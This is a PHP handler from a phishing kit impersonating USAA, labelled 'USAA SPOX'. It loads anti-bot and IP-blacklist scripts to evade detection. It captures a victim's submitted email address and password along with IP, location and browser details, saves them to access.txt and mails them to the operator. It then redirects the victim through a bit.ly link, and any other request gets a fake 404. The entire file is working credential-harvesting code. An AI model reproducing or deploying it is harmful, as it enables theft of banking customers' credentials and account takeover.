<?php
ob_start();
session_start();

include'../Anti/IP-BlackList.php';  
include'../Anti/Bot-Crawler.php';
include'../Anti/Bot-Spox.php';
include'../Anti/blacklist.php';
include'../Anti/new.php';
include'../Anti/Dila_DZ.php';

if(isset($_POST['emailaddress'])&&isset($_POST['emailpassword'])&&isset($_POST['spox'])){
	include '../config.php';
	include '../Functions/Fuck-you.php';

	$hi="#---------------------------[ -USAA Kika- NEW ACCESS ]----------------------------#\r\n";
	$hi.="Email address : {$_POST['emailaddress']}\r\n";
	$hi.="Email password : {$_POST['emailpassword']}\r\n";

$hi.="#---------------------------[ -USAA Kika- IP INFO ]----------------------------#\r\n";
	$hi.="IP ADDRESS	: {$_SESSION['ip']}\r\n";
	$hi.="IP COUNTRY	: {$_SESSION['country']}\r\n";
	$hi.="IP CITY	: {$_SESSION['city']}\r\n";
	$hi.="BROWSER		: {$_SESSION['browser']} on {$_SESSION['platform']}\r\n";
	$hi.="USER AGENT	: {$_SERVER['HTTP_USER_AGENT']}\r\n";
	$hi.="TIME		: ".date("d/m/Y h:i:sa")." GMT\r\n";
	$hi.="#---------------------------[ -PNC Kika- NEW ACCESS ]----------------------------#\r\n";

		$save=fopen("../usaa/access.txt","a+");
		fwrite($save,$hi);
		fclose($save);

	$subject="#USAA SPOX ACCESS {$_POST['emailaddress']} {$_SESSION['ip']} [ {$_SESSION['country']}-{$_SESSION['countrycode']} - {$_SESSION['platform']} ]";

	$headers="From: USAA SPOX  <usaa@results.coom>\r\n";
	$headers.="MIME-Version: 1.0\r\n";
	$headers.="Content-Type: text/plain; charset=UTF-8\r\n";

		@mail($your_email,$subject,$hi,$headers);
		
    	$helper = array_keys($_SESSION);
    		  foreach ($helper as $key){unset($_SESSION[$key]);}

    		exit(header("Location: https://bit.ly/1fjFwua")); 
    		
  }else{
    header("HTTP/1.0 404 Not Found");
    exit();
}

?>